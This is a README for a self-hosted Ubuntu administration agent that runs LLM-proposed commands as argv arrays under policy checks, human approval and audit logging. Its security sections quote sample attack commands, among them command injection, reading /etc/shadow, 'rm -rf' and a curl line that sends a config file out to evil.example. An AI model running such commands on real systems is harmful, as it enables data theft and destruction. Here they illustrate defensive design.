# AI Server Administration Agent

A self-hosted AI agent for Ubuntu server administration. The LLM reasons about problems; the agent executes **structured argv-based commands** under the Linux permissions of a dedicated `ai` user, with **policy enforcement**, **human approval**, and **audit logging**.

This project is designed so the LLM is **never given unrestricted shell access**.

## Quick start

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"

cp .env.example .env
# Edit OLLAMA_HOST / OLLAMA_MODEL as needed

ai-agent
```

Requirements:

- Python 3.11+
- [Ollama](https://ollama.com/) running locally or on your network
- Ubuntu server (target environment)
- Dedicated Linux user `ai` **without sudo**

## Architecture

```text
User (CLI)
    |
    v
Agent Loop  <-------------------->  Ollama / LLM
    |
    +--> Policy Engine (validate CommandExpr)
    |
    +--> Approval UX (confirm / batch preview / session grants)
    |
    +--> Executor (execve-style, no /bin/sh -c)
    |
    +--> Audit Logger
    |
    v
Linux (permissions of `ai` user)
```

### Responsibilities stay separate

| Layer | Role |
|-------|------|
| LLM | Reasoning and proposing structured commands |
| Agent | Policy, approval, execution, logging |
| Linux | Final permission boundary |
| Human | Approves consequential operations |

**The model must not approve its own actions.** Approval tokens are created by the CLI, not inferred from chat text.

---

## Command model: argv + structured chaining

The LLM proposes **CommandExpr** JSON, not shell strings.

Supported expression types:

| Type | Meaning | Example rendered form |
|------|---------|------------------------|
| `single` | One argv array | `df -h` |
| `pipe` | Left expression piped to right argv | `journalctl ... \| grep error` |
| `and` | Run right only if left exits 0 | `systemctl is-active nginx && systemctl restart nginx` |
| `or` | Run right only if left exits non-zero | `test -f /tmp/x \|\| echo missing` |
| `redirect` | Limited stdout/stderr redirect | `df -h > /tmp/ai-agent/out.txt` |

Every leaf command is an **argv array**:

```json
{"type": "single", "argv": ["docker", "ps"]}
```

Pipelines:

```json
{
  "type": "pipe",
  "left": {
    "type": "single",
    "argv": ["journalctl", "-u", "nginx", "-n", "100", "--no-pager"]
  },
  "right": ["grep", "-i", "error"]
}
```

### Why not raw shell strings?

**Do not pass model output to `/bin/sh -c`.** Allow-lists on shell strings are bypassable:

```bash
cat /etc/passwd; rm -rf /important
cat file$(curl attacker)
cat /safe/path | sh
grep pattern /etc/shadow
```

Even when the user approves what they see, metacharacters and chained semantics hide intent.

Instead:

1. The model emits structured JSON (`CommandExpr`)
2. The policy engine validates **each segment**
3. The executor runs argv arrays directly (`subprocess` with list args — **no shell**)
4. The CLI renders a human-readable command for approval

This gives a shell-like UX without shell parsing.

---

## Security model

### Risk levels

| Level | Behavior |
|-------|----------|
| `READ_ONLY` | May auto-run in balanced mode (`df`, `docker ps`, `journalctl`, etc.) |
| `REVERSIBLE` | Requires confirmation (`systemctl restart`, `docker restart`) |
| `DESTRUCTIVE` | Requires explicit confirmation (`docker rm`, `systemctl disable`) |
| `FORBIDDEN` | Hard reject — never executed (`docker run`, `rm -rf /`, shell binaries) |

Effective risk for chained expressions is the **maximum** risk of all segments.

Policy is enforced in **`ai_agent/policy/default_policy.yaml`**. The LLM cannot override it.

### Linux user boundary

Run the agent as user `ai`:

- No sudo
- No automatic sudoers modification
- If a command fails with `Permission denied`, the agent reports that honestly

**Important:** Adding `ai` to the `docker` group grants significant privilege (Docker socket ≈ root). Document and accept this consciously on home servers.

### Filesystem policy

Path arguments (`cat`, `grep`, `ls`, etc.) must fall under configured readable roots (see policy YAML).

Redirects (`>`, `>>`, `2>`) are only allowed into configured writable directories (default: `/tmp/ai-agent`).

Always canonicalize paths and reject traversal outside allowed roots.

### Network tools (localhost health checks only)

Network commands are a **separate trust boundary** from filesystem read access.

Even read-only disk access does not prevent exfiltration:

```bash
cat /home/user/.config/app/config | curl -X POST -d @- https://evil.example/leak
```

v1 policy for `curl` / `wget`:

- **Allowed:** `GET` / `HEAD` to `127.0.0.1`, `localhost`, `::1`
- **Forbidden:** upload flags (`-d`, `--data`, `-T`, …)
- **Forbidden:** piping stdin into `curl` / `wget`
- **Forbidden:** arbitrary remote hosts

This supports local health checks (`curl http://127.0.0.1:8080/health`) without opening general outbound network access.

### Environment hardening

The executor passes a **minimal environment** (`PATH`, `LANG`, `HOME`, etc.) to subprocesses to reduce injection via `LD_PRELOAD` and similar variables.

---

## Confirmation UX

Three modes via `AGENT_CONFIRMATION_MODE`:

| Mode | Behavior |
|------|----------|
| `paranoid` | Confirm every command, including READ_ONLY |
| `balanced` | Auto-run READ_ONLY; confirm REVERSIBLE+ (**default**) |
| `permissive` | Auto-run up to REVERSIBLE; confirm DESTRUCTIVE+ |

### Single-command approval

For REVERSIBLE+ commands, the CLI shows:

```text
AI wants to execute:
  systemctl restart nginx
  Risk: REVERSIBLE
  Reason: nginx appears unhealthy
  Segments:
    1. systemctl restart nginx  [REVERSIBLE]

Approve? [y/N/a=allow REVERSIBLE this session]:
```

### Batch preview (READ_ONLY inspections)

When the model proposes multiple READ_ONLY checks, the CLI can show one prompt:

```text
AI wants to run these READ_ONLY checks:
  1. df -h  [READ_ONLY]
  2. docker ps  [READ_ONLY]
  3. journalctl -u nginx -n 100 --no-pager | grep -i error  [READ_ONLY]

Proceed with batch? [Y/n/a=allow READ_ONLY this session]:
```

This reduces prompt fatigue while keeping mutations gated.

### Session grants

Optional responses like `a` / `allow` create **session-scoped grants** (e.g. skip READ_ONLY prompts for the rest of the session). Grants are stored in the CLI session state — **not** in LLM context where the model could forge them.

---

## Audit logging

Every tool invocation logs structured JSON lines:

- timestamp, session ID, user
- tool name, arguments, rendered command
- risk level, confirmation required/granted
- exit status, duration, errors
- stdout/stderr preview (truncated)

Configure with `AGENT_AUDIT_LOG=/var/log/ai-agent/audit.jsonl`.

Secrets are redacted from keys matching `password`, `token`, `secret`, etc.

---

## Configuration

See [`.env.example`](.env.example):

| Variable | Description |
|----------|-------------|
| `OLLAMA_HOST` | Ollama API base URL |
| `OLLAMA_MODEL` | Model name |
| `AGENT_LOG_LEVEL` | Logging level |
| `AGENT_MAX_ITERATIONS` | Max tool-call loop iterations |
| `AGENT_TOOL_TIMEOUT` | Per-command timeout (seconds) |
| `AGENT_CONFIRMATION_MODE` | `paranoid` / `balanced` / `permissive` |
| `AGENT_OUTPUT_LIMIT` | Max stdout/stderr returned to model |
| `AGENT_AUDIT_LOG` | Audit log file path |
| `AGENT_POLICY_FILE` | Override policy YAML path |
| `AGENT_SCRATCH_DIR` | Writable scratch dir for redirects |

---

## Developer guide: avoiding security regressions

Read this before adding commands, tools, or policy rules.

### 1. Never add shell execution

```python
# FORBIDDEN
subprocess.run(command_string, shell=True)
subprocess.run(["/bin/sh", "-c", model_output])
```

```python
# CORRECT
subprocess.run(argv_list, shell=False)
```

### 2. Never trust model output

All tool arguments are **attacker-controlled input**. Validate structure (Pydantic) **and** semantics (policy engine).

### 3. Do not parse shell syntax from strings

If you need new chaining behavior, add a new **`CommandExpr` type** and validate it explicitly — do not regex-match user/model strings.

### 4. Expand allow-lists carefully

When adding policy rules, specify:

- binary name
- subcommand (if applicable)
- path argument requirements
- network restrictions (if applicable)
- risk level

Default for unmatched commands is **FORBIDDEN**.

### 5. Beware implicit privilege escalation

| Change | Risk |
|--------|------|
| Adding `ai` to `docker` group | Near-root access |
| Allowing `docker run` | Container escape / mount host FS |
| Allowing remote `curl` | Data exfiltration |
| Allowing `\| sh` or `xargs` | Full shell bypass |
| Broadening readable paths to `/` | Credential exposure |

### 6. Chain risk aggregation

When adding operators, compute effective risk as **max(segment risks)** and reject the whole expression if any segment is FORBIDDEN.

### 7. Do not let the model self-approve

Never encode approval as a tool result the model can write. Approval must come from the CLI input layer.

### 8. Test policy, not just happy paths

Add tests for:

- forbidden patterns
- path traversal
- network exfil attempts
- chained bypass attempts
- confirmation gates
- audit records on denial

Run tests:

```bash
pytest
```

---

## Project layout

```text
ai_agent/
  agent/          # Agent loop and tool schemas
  approval/       # Confirmation UX and session grants
  audit/          # Audit logging
  cli/            # Terminal interface (`ai-agent`)
  commands/       # CommandExpr AST, render, executor
  llm/            # Ollama provider abstraction
  policy/         # Risk levels, policy engine, default_policy.yaml
tests/
```

---

## Roadmap (not yet implemented)

- Web UI with the same approval token model
- AppArmor / Landlock profiles
- OS-level network restrictions for `ai` user
- Persistent memory, scheduled tasks, notifications
- Additional LLM providers

---

## License

MIT
